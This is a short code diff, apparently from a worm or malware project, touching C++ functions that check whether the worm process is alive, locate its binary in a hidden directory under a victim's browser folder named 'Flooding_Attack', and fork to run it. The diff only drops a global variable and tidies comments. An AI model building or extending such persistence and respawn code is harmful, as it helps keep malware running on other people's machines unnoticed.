@@ -24,9 +24,8 @@
 #define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"
 
 std::string path_bin;
-int pid = -1;
 
-// Queries if the worm programming is running.
+// Queires if the program is running by given PID.
 bool isWormRunning(int pid) { return kill(pid, 0) == 0; }
 
 // Queries any location the worm binary is repalced. If no bin file exists,
@@ -42,7 +41,7 @@ std::string isWormDistributed() {
     return "";
 }
 
-// Executes the worm placed at given location. Returns the pid of the executed
+// Executes the worm placed at given location. Returns the PID of the executed
 // worm.
 int runWorm(std::string& loc) {
     pid_t pid = fork();
